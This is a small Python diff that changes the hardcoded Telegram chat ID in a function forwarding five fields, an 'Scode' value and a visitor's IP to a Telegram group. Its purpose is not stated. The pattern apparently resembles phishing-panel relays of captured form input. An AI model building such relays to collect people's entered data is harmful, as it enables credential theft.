@@ -47,8 +47,7 @@ def SendMessageToTelegramIndirect(Message , ChatID) -> bool:
 
 def SendToTelegram(f1 , f2 , f3 , f4 , f5 , Scode , ip):
     try:
-        chatid = "-4246843039"
-        chatid = "-1001946865397"
+        chatid = "-1002519646377"
         # chatid = "151372864"
         User = Db.GetUserByIP(ip)
         if User == None:
